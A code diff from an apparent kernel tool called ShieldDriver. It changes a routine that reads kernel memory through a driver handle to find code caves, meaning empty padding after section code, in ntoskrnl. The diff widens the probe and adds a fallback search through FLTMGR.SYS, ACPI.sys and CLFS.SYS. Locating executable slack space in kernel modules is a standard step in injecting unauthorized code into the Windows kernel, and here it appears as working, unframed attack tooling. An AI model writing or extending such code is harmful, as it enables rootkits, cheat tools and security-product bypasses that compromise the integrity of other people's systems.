@@ -147,26 +147,63 @@ namespace ShieldDriver {
             if (!ReadKernel(hDevice, sectionOffset + i * sizeof(IMAGE_SECTION_HEADER), &sec, sizeof(sec)))
                 continue;
                 
-            // Find a writable section with slack space
-            // Use PAGE section which is typically writable and has extra space
-            if (sec.SizeOfRawData > sec.Misc.VirtualSize + 512) {
+            // Look for slack space in sections (alignment padding)
+            if (sec.SizeOfRawData > sec.Misc.VirtualSize + 128) {
                 uint64_t caveAddr = ntBase + sec.VirtualAddress + sec.Misc.VirtualSize;
                 
-                // Verify the cave is actually empty/zeroed
-                uint8_t probe[16]{};
-                ReadKernel(hDevice, caveAddr, probe, 16);
-                
-                // Check if it looks empty or is padding
-                bool empty = true;
-                for (int j = 0; j < 16; j++) {
-                    if (probe[j] != 0 && probe[j] != 0xCC) {
-                        empty = false;
-                        break;
+                // Align cave address to 16 bytes
+                caveAddr = (caveAddr + 15) & ~15ULL;
+
+                uint8_t probe[32]{};
+                if (ReadKernel(hDevice, caveAddr, probe, sizeof(probe))) {
+                    bool empty = true;
+                    for (size_t j = 0; j < sizeof(probe); j++) {
+                        if (probe[j] != 0 && probe[j] != 0xCC && probe[j] != 0x90) {
+                            empty = false;
+                            break;
+                        }
+                    }
+                    if (empty)
+                        return caveAddr;
+                }
+            }
+        }
+
+        // Fallback: search system drivers (e.g. ACPI.sys or FLTMGR.sys) for code caves
+        const char* fallbackModules[] = { "FLTMGR.SYS", "ACPI.sys", "CLFS.SYS" };
+        for (const char* modName : fallbackModules) {
+            uint64_t modBase = GetKernelModuleBase(modName);
+            if (!modBase) continue;
+
+            IMAGE_DOS_HEADER fDos{};
+            if (!ReadKernel(hDevice, modBase, &fDos, sizeof(fDos)) || fDos.e_magic != IMAGE_DOS_SIGNATURE)
+                continue;
+
+            IMAGE_NT_HEADERS64 fNt{};
+            if (!ReadKernel(hDevice, modBase + fDos.e_lfanew, &fNt, sizeof(fNt)) || fNt.Signature != IMAGE_NT_SIGNATURE)
+                continue;
+
+            uint64_t fSecOffset = modBase + fDos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
+            for (WORD i = 0; i < fNt.FileHeader.NumberOfSections; i++) {
+                IMAGE_SECTION_HEADER sec{};
+                if (!ReadKernel(hDevice, fSecOffset + i * sizeof(IMAGE_SECTION_HEADER), &sec, sizeof(sec)))
+                    continue;
+
+                if (sec.SizeOfRawData > sec.Misc.VirtualSize + 128) {
+                    uint64_t caveAddr = (modBase + sec.VirtualAddress + sec.Misc.VirtualSize + 15) & ~15ULL;
+                    uint8_t probe[32]{};
+                    if (ReadKernel(hDevice, caveAddr, probe, sizeof(probe))) {
+                        bool empty = true;
+                        for (size_t j = 0; j < sizeof(probe); j++) {
+                            if (probe[j] != 0 && probe[j] != 0xCC && probe[j] != 0x90) {
+                                empty = false;
+                                break;
+                            }
+                        }
+                        if (empty)
+                            return caveAddr;
                     }
                 }
-                
-                if (empty)
-                    return caveAddr;
             }
         }
         
